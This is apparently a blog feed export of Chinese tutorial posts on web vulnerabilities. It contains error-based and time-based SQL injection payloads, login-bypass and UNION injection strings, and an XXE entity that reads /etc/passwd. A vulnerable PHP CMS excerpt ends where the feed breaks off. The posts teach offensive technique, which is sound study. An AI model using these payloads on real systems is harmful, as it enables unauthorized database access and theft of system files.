class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">find_in_set()：查询str是否在strlist里</span><br><span class="line"></span><br><span class="line">示例：FIND_IN_SET(str,strlist)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT FIND_IN_SET(&#39;b&#39;, &#39;a,b,c,d&#39;);</span><br><span class="line">-&gt; 2                   因为b 在strlist集合中放在2的位置 从1开始</span><br></pre></td></tr></table></figure><p>下图是可被查询到的结果，我们可以看到sleep了一段时间，经测试发现，睡眠时间每次不定，不利于用作真实渗透测试<br><img src="https://img-blog.csdnimg.cn/20191011222610227.png" alt="可查询到"><br>下图是未被查询到的结果，我们可以看到没有sleep<br><img src="https://img-blog.csdnimg.cn/20191011222753982.png" alt="未查询到"></p><h4 id="3-UNION-SELECT-IF-SUBSTRING-current-1-1-CHAR-119-BENCHMARK-5000000-ENCODE-‘M"><a href="#3-UNION-SELECT-IF-SUBSTRING-current-1-1-CHAR-119-BENCHMARK-5000000-ENCODE-‘M" class="headerlink" title="3. UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘M"></a>3. UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘M</h4><p>SG’,’by 5 seconds’)),null) FROM (select database() as t1;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">上面有说到benchmark()函数和encode()函数，下面我们仔细说下</span><br><span class="line"></span><br><span class="line">endoce()：使用key对text进行加密</span><br><span class="line">示例：ENCODE(&#39;text&#39;,&#39;key&#39;);</span><br><span class="line"></span><br><span class="line">BENCHMARK()：可控制次数的执行函数</span><br><span class="line">示例：benchmark(count,expr)            count为次数，expr为要执行的表达</span><br><span class="line">式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执</span><br><span class="line">行成功。这是一种边信道攻击，可在运行过程中占用大量的 cpu 资源。</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">IF</span>(  <span class="keyword">SUBSTRING</span>(<span class="keyword">current</span>,<span class="number">1</span>,<span class="number">1</span>)=<span class="built_in">CHAR</span>(<span class="number">119</span>),    <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">ENCODE</span>(‘MSG’,’<span class="keyword">by</span> <span class="number">5</span> <span class="keyword">seconds</span>’))     ,  <span class="literal">null</span>) <span class="keyword">FROM</span> (<span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">as</span> <span class="keyword">current</span>) <span class="keyword">as</span> t1;</span><br><span class="line">将其分开可看到此语句是通过先判断当前数据库名第一位是否为猜测值，如果是，则执行benchmark()函数，否为返回null</span><br></pre></td></tr></table></figure><p>下图是执行次数大小效果的对比</p><p><img src="https://img-blog.csdnimg.cn/20191011230726771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="执行效果"><br>因为不是很建议用上面那个函数，下面列出几种函数（取自《白帽子讲安全》）<br><img src="https://img-blog.csdnimg.cn/20191011231237260.png" alt="在这里插入图片描述"></p><h3 id="报错盲注："><a href="#报错盲注：" class="headerlink" title="报错盲注："></a>报错盲注：</h3><p>程序将错误信息输出到了页面上，其格式有多种，大体如下（重点讲解Duplicate entry报错，Xpath报错，整形溢出报错）</p><h4 id="1-Duplicate-entry报错："><a href="#1-Duplicate-entry报错：" class="headerlink" title="1.Duplicate entry报错："></a>1.Duplicate entry报错：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))</span><br><span class="line"><span class="keyword">as</span> a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br></pre></td></tr></table></figure><hr><p>原理是查询时会建立临时表存储数据，不存在键值就插入，group by使插入前rand()会再执行一次，存在就直接值加1。以上用到几种函数：count(), concat(), floor()，rand()，简单说下：</p><ol><li><p>count() 函数返回与指定条件匹配的行数。<br>eg：SELECT COUNT(column_name) FROM table_name WHERE condition;</p></li><li><p>concat() 函数将两个或多个表达式加在一起。<br>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat(&#39;11&#39;,&#39;22&#39;,&#39;33&#39;);</span><br><span class="line">+------------------------+</span><br><span class="line">| concat(&#39;11&#39;,&#39;22&#39;,&#39;33&#39;) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 112233 |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat(&#39;11&#39;,&#39;22&#39;,null);</span><br><span class="line">+------------------------+</span><br><span class="line">| concat(&#39;11&#39;,&#39;22&#39;,null) |</span><br><span class="line">+------------------------+</span><br><span class="line">| NULL   |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><ol start="3"><li><p>floor() 函数返回小于或等于数字的最大整数值。并向下取整排列。<br>eg：SELECT FLOOR(25.75) AS FloorValue;      结果：25</p></li><li><p>rand() 函数返回 [0,1) 的随机数。<br>eg：SELECT RAND();             结果：0.455611560918029等<br>查询第一条记录，rand(0)得键值0不存在临时表，执行插入，此时rand(0)再执行，得1，于是插入了1。<br>查询第二条记录，rand(0)得1，键值1存在临时表，则值加1得2。<br>查询第三条记录，rand(0)得0，键值0不存在临时表，执行插入，rand(0)再次执行，得键值1，1存在于临时表，由于键值必须唯一，导致报错。<br>例如通过floor报错,注入语句如下:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(),<span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br></pre></td></tr></table></figure></li></ol><hr><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">最上面那个sql语句可以简化成这个</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="keyword">user</span>(),</span><br><span class="line"><span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">如果关键的表被禁用了，可以使用这种形式</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span> <span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> !<span class="number">1</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="keyword">user</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">如果 rand 被禁用了可以使用用户变量来报错</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">min</span>(@a:=<span class="number">1</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(passwo</span><br><span class="line">rd,@a:=(@a+<span class="number">1</span>)%<span class="number">2</span>);</span><br></pre></td></tr></table></figure><h4 id="2-Xpath报错-Mysql5-1-5-："><a href="#2-Xpath报错-Mysql5-1-5-：" class="headerlink" title="2.Xpath报错(Mysql5.1.5)："></a>2.Xpath报错(Mysql5.1.5)：</h4><p>以下两个函数都可为xml进行查询修改，最大爆出32位<br>例如（2）通过ExtractValue报错,注入语句如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</span><br></pre></td></tr></table></figure><p>（3）通过UpdateXml报错,注入语句如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1))</span><br></pre></td></tr></table></figure><p>这里介绍以下updatexml()语法:<br>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p><h4 id="3-exp报错和整形溢出报错-Mysql-gt-5-5-5-："><a href="#3-exp报错和整形溢出报错-Mysql-gt-5-5-5-：" class="headerlink" title="3.exp报错和整形溢出报错(Mysql&gt;5.5.5)："></a>3.exp报错和整形溢出报错(Mysql&gt;5.5.5)：</h4><p>exp(x):计算e的x次方<br>有两种方法：<br>1.<a href="https://www.cnblogs.com/lcamry/articles/5509124.html" target="_blank" rel="noopener">exp进行报错</a>，原理是Exp()超过710会产生溢出。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eg payload: <span class="keyword">select</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)x));</span><br></pre></td></tr></table></figure><p>2.<a href="https://www.cnblogs.com/lcamry/articles/5509112.html" target="_blank" rel="noopener">bigint溢出报错</a>，原理是将0按位取反就会返回“18446744073709551615”，而函数执行成功会返回0，所以将成功执行的函数取反就会得到最大的无符号BIGINT值，从而造成报错。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eg payload：!(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)x)-~<span class="number">0</span></span><br></pre></td></tr></table></figure><p>点击上面的方法，可查看讲的很不错的文章。</p><h4 id="4-数据重复报错-低版本-："><a href="#4-数据重复报错-低版本-：" class="headerlink" title="4.数据重复报错(低版本)："></a>4.数据重复报错(低版本)：</h4><p>通过NAME_CONST报错,注入语句如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))a;</span><br></pre></td></tr></table></figure><p>mysql 重复特性，此处重复了 version，所以报错。<br>(拿个小本本记下来，因为只搞到version()就比较鸡肋，求大佬解决)</p><h4 id="5-其他报错注入："><a href="#5-其他报错注入：" class="headerlink" title="5.其他报错注入："></a>5.其他报错注入：</h4><p>通过join报错,注入语句如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from(select * from mysql.user ajoin mysql.user b)c;</span><br></pre></td></tr></table></figure><p>通过GeometryCollection()报错,注入语句如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and GeometryCollection(()select *from(select user () )a)b );</span><br></pre></td></tr></table></figure><p>通过polygon ()报错,注入语句如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and polygon (()select * from(select user ())a)b );</span><br></pre></td></tr></table></figure><p>通过multipoint ()报错,注入语句如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multipoint (()select * from(select user() )a)b );</span><br></pre></td></tr></table></figure><p>通过multlinestring ()报错,注入语句如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multlinestring (()select * from(selectuser () )a)b );</span><br></pre></td></tr></table></figure><p>通过multpolygon ()报错,注入语句如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multpolygon (()select * from(selectuser () )a)b );</span><br></pre></td></tr></table></figure><p>通过linestring ()报错,注入语句如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and linestring (()select * from(select user() )a)b );</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL注入两大类：&quot;&gt;&lt;a href=&quot;#SQL注入两大类：&quot; class=&quot;headerlink&quot; title=&quot;SQL注入两大类：&quot;&gt;&lt;/a&gt;SQL注入两大类：&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;字符型注入&lt;br&gt;例如：&lt;a href=&quot;http://XXX.com/
      
    
    </summary>
    
    
      <category term="web漏洞总结" scheme="http://y-y-k.tk/categories/web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="web漏洞总结" scheme="http://y-y-k.tk/tags/web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
      <category term="SQL注入" scheme="http://y-y-k.tk/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入（一）</title>
    <link href="http://y-y-k.tk/2020/03/15/SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://y-y-k.tk/2020/03/15/SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2020-03-15T03:01:00.858Z</published>
    <updated>2020-03-15T03:04:33.556Z</updated>
    
    <content type="html"><![CDATA[<h1 id="以下为此漏洞的初级知识分类"><a href="#以下为此漏洞的初级知识分类" class="headerlink" title="以下为此漏洞的初级知识分类"></a>以下为此漏洞的初级知识分类</h1><p>在这里，你将学到初级的SQL注入漏洞，如有想深入学习，请继续关注此博客，谢谢。</p><h2 id="数据库的基本概念"><a href="#数据库的基本概念" class="headerlink" title="数据库的基本概念"></a>数据库的基本概念</h2><p>数据库大致可以分为四点：</p><ol><li><p><strong>数据(Data)</strong>：<br>在计算机中，各种我们所看到的字母，文字，字符串，语音，图片视频等统称为数据。</p></li><li><p><strong>数据库(DB)</strong>【Access、MYSQL、Oracle、MSSQL等】<br>是按照数据结构来组织、存储和管理数据的“仓库”</p></li><li><p><strong>数据库管理系统(DBMS）</strong>【Access、MYSQL、Oracle、MSSQL等】是一种操纵和管理数据库的软件，用于建立、使用和维护数据库。它对数据库进行统一的管理和控制,以保证数据库的安全性和完整性。</p></li><li><p><strong>结构化查询语言（SQL）</strong>【DQL、DDL、DML、TCL、DCL】是一种用于数据库查询和程序设计的语言，用于存取数据以及查询、更新和管理关系数据库系统</p></li></ol><h2 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h2><p>   SQL注入攻击就是在一些涉及到SQL语句，也就是SQL 数据库查询的功能进行恶意构造语句执行SQL命令，或通过提供恶意的数据包执行恶意的SQL命令。一般情况下，往往是应用程序缺少对输入进行安全性设计。</p><h2 id="SQL注入方法"><a href="#SQL注入方法" class="headerlink" title="SQL注入方法"></a>SQL注入方法</h2><p>攻击者将一些包含指令的数据发送给解释器，欺骗解释器执行计划外的命令。 </p><h2 id="SQL注入危害"><a href="#SQL注入危害" class="headerlink" title="SQL注入危害"></a>SQL注入危害</h2><p>读取或篡改数据库的信息，甚至能够获得服务器的包括管理员的权限。</p><h2 id="SQL注入防御（日后另起一篇持续更）"><a href="#SQL注入防御（日后另起一篇持续更）" class="headerlink" title="SQL注入防御（日后另起一篇持续更）"></a>SQL注入防御（日后另起一篇持续更）</h2><p>1 、参数校验；2、对数据库权限做限制；3、使用 PrepareStatement等</p><h2 id="SQL注入简易讲解"><a href="#SQL注入简易讲解" class="headerlink" title="SQL注入简易讲解"></a>SQL注入简易讲解</h2><h3 id="查询流程对比"><a href="#查询流程对比" class="headerlink" title="查询流程对比"></a>查询流程对比</h3><p>一个正常的查询流程如下：<br>请求网站—&gt;查看是否有查询语句—&gt;语法检查—&gt;从数据库里查询—&gt;返回查询信息</p><p>注入攻击的流程如下：<br>构造SQL攻击语句—&gt;查看是否有查询语句—&gt;语法检查—&gt;从数据库里查询—&gt;返回查询信息—&gt;通过返回信息进行进一步攻击查询或得到管理员权限进行入侵等。</p><h3 id="常用测试语句"><a href="#常用测试语句" class="headerlink" title="常用测试语句"></a>常用测试语句</h3><p>以下可用get或用post方式进行执行语句,过于简单，在此不做演示</p><ol><li><strong>单引号及or关键字</strong><br>我们看下面的这句常用登陆查询语句<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Users WHERE Username&#x3D;&#39;$username&#39; AND Password&#x3D;&#39;$password&#39;</span><br></pre></td></tr></table></figure>如果我们构造  username=1′or′1′=′1password=1’or’1’=’1 ，或者在username查询成功后直接将paassword注释掉，这样就可以直接绕过进行登陆。</li></ol><p>以下为代入的SQL语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Users WHERE Username&#x3D;&#39;1&#39; OR &#39;1&#39;&#x3D;&#39;1&#39; AND Password&#x3D;&#39;1&#39;OR &#39;1&#39;&#x3D;&#39;1&#39;</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>使用括号</strong><br>我们看下面这个语句，我们可以先加个括号，然后把后面的password段注释掉，这样就达到了我们攻击的目的。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Users WHERE((Username&#x3D;&#39;$username&#39;)AND(Password&#x3D;MD5(&#39;$password&#39;)))</span><br></pre></td></tr></table></figure>以下为带入的SQL语句：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1′or′1′&#x3D;′1′))&#x2F;∗password &#x3D; 1</span><br></pre></td></tr></table></figure></li><li><strong>Union查询SQL</strong><br>利用Union可以进行连接查询，从而进一步得到信息，假设如下查询：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT Name, Phone, Address FROM Users WHERE Id&#x3D;$id</span><br></pre></td></tr></table></figure>那么我们设置ID的值为：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id &#x3D;1 UNION ALL SELECT StudentNumber,1,1 FROM StudentTable</span><br></pre></td></tr></table></figure>那么整体的查询就会变为：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT Name, Phone,Address FROM Users WHERE Id&#x3D;1 UNION ALL SELECT StudentNumber,1,1 FROM StudentTable</span><br></pre></td></tr></table></figure></li></ol><h2 id="SQL注入分类（日后另起一篇持续更）"><a href="#SQL注入分类（日后另起一篇持续更）" class="headerlink" title="SQL注入分类（日后另起一篇持续更）"></a>SQL注入分类（日后另起一篇持续更）</h2><ul><li>手工注入<ul><li>宽字节注入</li><li>盲注<ul><li>时间盲注</li><li>报错盲注</li><li>布尔型盲注</li></ul></li><li>其他注入  </li></ul></li><li>自动化注入—-sqlmap </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;以下为此漏洞的初级知识分类&quot;&gt;&lt;a href=&quot;#以下为此漏洞的初级知识分类&quot; class=&quot;headerlink&quot; title=&quot;以下为此漏洞的初级知识分类&quot;&gt;&lt;/a&gt;以下为此漏洞的初级知识分类&lt;/h1&gt;&lt;p&gt;在这里，你将学到初级的SQL注入漏洞，如有想深入学习
      
    
    </summary>
    
    
      <category term="web漏洞总结" scheme="http://y-y-k.tk/categories/web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="web漏洞总结" scheme="http://y-y-k.tk/tags/web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
      <category term="SQL注入" scheme="http://y-y-k.tk/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>xml注入</title>
    <link href="http://y-y-k.tk/2020/03/14/xml%E6%B3%A8%E5%85%A5/"/>
    <id>http://y-y-k.tk/2020/03/14/xml%E6%B3%A8%E5%85%A5/</id>
    <published>2020-03-14T12:26:50.629Z</published>
    <updated>2020-03-15T02:59:56.243Z</updated>
    
    <content type="html"><![CDATA[<p>首先，我们需要对<a href="https://www.runoob.com/xml/xml-tutorial.html" target="_blank" rel="noopener">XML</a>进行一定的了解，在这里不做过多的多余叙述，接下图为XML工作流程：<br><img src="https://img-blog.csdnimg.cn/20200210154120319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="简易xml概括"><a href="#简易xml概括" class="headerlink" title="简易xml概括"></a>简易xml概括</h1><h2 id="实体引用"><a href="#实体引用" class="headerlink" title="实体引用"></a>实体引用</h2><p>对于实体ENTITY，XML定义了两种类型的实体，一种在XML文档中使用，另一种作为参数在DTD中使用。语法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 名字 [&lt;!ENTITY 实体名 <span class="string">"实体内容"</span>]&gt;</span><br></pre></td></tr></table></figure><p>楼下为预定义的实体引用<br><img src="https://img-blog.csdnimg.cn/20200210154419572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="DTD-文档类型定义"><a href="#DTD-文档类型定义" class="headerlink" title="DTD(文档类型定义)"></a>DTD(文档类型定义)</h2><h3 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h3><p>其可定义XML文档的合法构建模块，可在XML文档内声明，也可外部引用。</p><h3 id="构建方式："><a href="#构建方式：" class="headerlink" title="构建方式："></a>构建方式：</h3><p>先来说下CDATA，指由XML解析器进行解析的文本数据（未分析的字符数据）。在XML中，＜，＆字符为非法，避免麻烦例如JS代码，就将脚本代码定为CDATA ，其中的内容都会被解析器忽略，组成结构为：<code>&quot; &lt;![CDATA [&quot; ****&quot;]]&gt;&quot;</code>。其次就是普通声明及引用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name <span class="string">"entity-value"</span>&gt;</span><br></pre></td></tr></table></figure><p>引用：<br><code>&lt;message&gt;＆entity-name; &lt;/ message&gt;</code>，即可将“ entity-value”展示出来</p><h4 id="1-内部实体声明"><a href="#1-内部实体声明" class="headerlink" title="1.内部实体声明"></a>1.内部实体声明</h4><p>内部实体指在一个实体中定义的另一个实体,可用单双引号来区分内外部。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eg:&lt;!ENTITY % in <span class="string">"&lt;!ENTITY web 'http://vps'&gt;"</span>&gt;  </span><br><span class="line">%in;</span><br></pre></td></tr></table></figure><h4 id="2-外部实体声明及默认协议"><a href="#2-外部实体声明及默认协议" class="headerlink" title="2.外部实体声明及默认协议"></a>2.外部实体声明及默认协议</h4><p><img src="https://img-blog.csdnimg.cn/20200210155742589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eg: <span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ENTITY flag SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;a&gt;&amp;flag;&lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="3-参数实体"><a href="#3-参数实体" class="headerlink" title="3.参数实体"></a>3.参数实体</h4><p>参数实体仅用于DTD和文档的内部子集中，XML的规范定义中，仅在DTD中才能引用参数实体。并且参数实体的引用在DTD中是该类型的实体使用“百分比”字符（或十六进制）编码的百分比）声明，并且仅在经过解析和验证后才用于替换DTD中的文本或其他内容，其在DTD中的解析优先于XML文本中的内部实体解析。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eg: <span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">&lt;!ENTITY % one <span class="string">"hello"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">%one;</span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="原理-以PHPYun-cms为例"><a href="#原理-以PHPYun-cms为例" class="headerlink" title="原理(以PHPYun cms为例)"></a>原理(以PHPYun cms为例)</h3><p>这里的漏洞位置为此cms的<code>weixin/model/index.class.php</code>,如下所示:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">responseMsg</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">    $postStr = $GLOBALS[<span class="string">"HTTP_RAW_POST_DATA"</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($postStr))&#123;</span><br><span class="line"></span><br><span class="line">                 $postObj = simplexml_load_string($postStr, <span class="string">'SimpleXMLElement'</span>, LIBXML_NOCDATA);</span><br><span class="line">                  $fromUsername = $postObj-&gt;FromUserName;</span><br><span class="line">                  $toUsername = $postObj-&gt;ToUserName;</span><br><span class="line">                  $keyword = trim($postObj-&gt;Content);</span><br><span class="line">                  $time = time();</span><br><span class="line">                  $textTpl = <span class="string">"&lt;xml&gt;</span></span><br><span class="line"><span class="string">         &lt;![CDATA[%s]]&gt;</span></span><br><span class="line"><span class="string">         